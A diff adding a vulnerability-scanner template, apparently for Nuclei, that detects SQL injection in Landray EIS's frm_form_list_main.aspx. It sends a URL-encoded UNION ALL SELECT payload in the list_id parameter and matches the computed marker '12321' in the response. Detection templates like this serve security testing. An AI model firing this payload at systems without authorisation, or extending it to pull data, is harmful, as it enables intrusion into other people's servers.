@@ -1,0 +1,20 @@
+id: landray-eis-frm-form-list-main-sqli
+
+info:
+  name: 蓝凌EIS frm_form_list_main.aspx SQL注入
+  author: SleepingBag945
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /frm/frm_form_list_main.aspx?list_id=1%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20SxwK HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==500 && contains_all(body,"12321")
